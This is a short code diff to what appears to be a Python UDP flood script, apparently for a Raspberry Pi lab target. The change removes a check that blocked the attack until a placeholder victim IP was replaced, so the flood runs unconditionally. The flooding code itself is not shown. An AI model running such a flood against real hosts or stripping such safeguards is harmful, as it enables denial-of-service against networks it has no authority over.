@@ -44,7 +44,4 @@ def udp_flood(target_ip, target_port, duration):
         print("\nAttack stopped.")
 
 if __name__ == "__main__":
-    if VICTIM_IP == "YOUR_RASPBERRY_PI_IP":
-        print("ERROR: Please change the VICTIM_IP variable in the script.")
-    else:
-        udp_flood(VICTIM_IP, TARGET_PORT, ATTACK_DURATION_SECONDS)
+    udp_flood(VICTIM_IP, TARGET_PORT, ATTACK_DURATION_SECONDS)
